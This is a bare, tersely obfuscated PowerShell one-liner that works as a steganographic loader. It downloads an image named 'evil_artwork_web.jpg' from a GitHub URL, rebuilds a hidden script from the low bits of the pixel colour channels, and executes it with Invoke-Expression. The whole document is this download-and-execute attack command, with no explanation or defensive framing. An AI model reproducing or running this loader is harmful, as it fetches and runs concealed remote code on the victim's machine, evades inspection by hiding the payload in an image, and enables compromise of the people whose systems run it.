sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("https://github.com/vkxz/steg/blob/master/demo/evil_artwork_web.jpg"));$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..784]))
